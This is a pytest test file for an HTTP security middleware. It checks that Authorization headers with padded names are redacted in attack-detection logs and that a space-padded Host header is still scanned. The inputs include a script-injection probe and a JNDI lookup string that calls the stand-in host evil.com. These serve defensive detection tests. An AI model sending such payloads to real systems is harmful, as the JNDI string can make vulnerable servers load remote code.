import logging
from unittest.mock import MagicMock

import pytest

from guard_core.models import SyncSecurityConfig
from guard_core.sync.core.checks.implementations.suspicious_activity import (
    SuspiciousActivityCheck,
)
from guard_core.sync.core.checks.pipeline import SecurityCheckPipeline
from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest

_SECRET = "SECRET-HEADER-TRAILING-SPACE"


@pytest.fixture(autouse=True)
def _force_enhanced_detection_singleton() -> None:
    sus_patterns_handler.configure(SyncSecurityConfig())


def _detection_lines(caplog: pytest.LogCaptureFixture) -> list[str]:
    return [
        line for line in caplog.text.splitlines() if "Potential attack detected" in line
    ]


def _make_middleware(config: SyncSecurityConfig) -> MagicMock:
    middleware = MagicMock()
    middleware.config = config
    middleware.logger = logging.getLogger("guard_core.test.header_space")
    middleware.event_bus = MagicMock()
    middleware.event_bus.send_middleware_event = MagicMock()
    middleware.create_error_response = MagicMock(
        return_value=MagicMock(status_code=403)
    )
    middleware.route_resolver = MagicMock()
    middleware.route_resolver.should_bypass_check = MagicMock(return_value=False)
    middleware.geo_ip_handler = None
    return middleware


def test_header_name_with_trailing_space_treated_as_sensitive_in_detection_line(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig()
    request = SyncMockGuardRequest(
        headers={"Authorization ": f"Bearer {_SECRET} <script>alert(1)</script>"},
    )

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
    lines = _detection_lines(caplog)
    assert lines, "no detection log line captured"
    assert "[REDACTED]" in lines[0]
    assert _SECRET not in caplog.text


def test_header_name_with_trailing_space_redacted_in_headers_dump(
    caplog: pytest.LogCaptureFixture,
) -> None:
    client_ip = "203.0.113.90"
    config = SyncSecurityConfig()
    middleware = _make_middleware(config)
    check = SuspiciousActivityCheck(middleware)
    pipeline = SecurityCheckPipeline([check])

    request = SyncMockGuardRequest(
        path="/",
        method="GET",
        headers={"Authorization ": f"Bearer {_SECRET} <script>alert(1)</script>"},
        client_host=client_ip,
    )
    request.state.client_ip = client_ip
    request.state.route_config = None

    with caplog.at_level(logging.WARNING):
        result = pipeline.execute(request)

    assert result is not None
    lines = [
        line
        for line in caplog.text.splitlines()
        if "Suspicious activity detected" in line
    ]
    assert lines, "no suspicious activity log line captured"
    assert "[REDACTED]" in lines[0]
    assert _SECRET not in caplog.text


def test_excluded_header_name_with_leading_space_still_scanned_for_jndi_shield(
    caplog: pytest.LogCaptureFixture,
) -> None:
    config = SyncSecurityConfig()
    request = SyncMockGuardRequest(
        headers={" Host": "${jndi:ldap://evil.com/a}"},
    )

    with caplog.at_level(logging.WARNING, logger="guard_core"):
        result = detect_penetration_attempt(request, config)

    assert result.is_threat is True
